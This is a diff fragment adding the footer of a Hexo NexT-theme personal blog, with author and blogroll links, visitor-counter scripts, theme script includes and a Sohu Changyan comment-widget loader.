+      <span class="links-of-author-item">
+        <a href="https://github.com/lhc0101" title="Github → https://github.com/lhc0101" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/lhc0101" title="Gitee → https://gitee.com/lhc0101" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Gitee</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=qJmcmp_akJ6ZmZHo2dmGy8fF" title="E-mail → http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=qJmcmp_akJ6ZmZHo2dmGy8fF" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://Li-rr.github.io" title="https://Li-rr.github.io" rel="noopener" target="_blank">LRR</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">超超</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">592k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">8:58</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+<script src="/js/utils.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <script>
+  NexT.utils.loadComments(document.querySelector('#SOHUCS'), () => {
+    var appid = 'cyvEvEbk0';
+    var conf = '36cf39268529f13ea45698266acf4f47';
+    var width = window.innerWidth || document.documentElement.clientWidth;
+    if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>');
+    } else {
+      var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})});
+    }
+  });
+  </script>
+  <script src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+
+</body>
+</html>
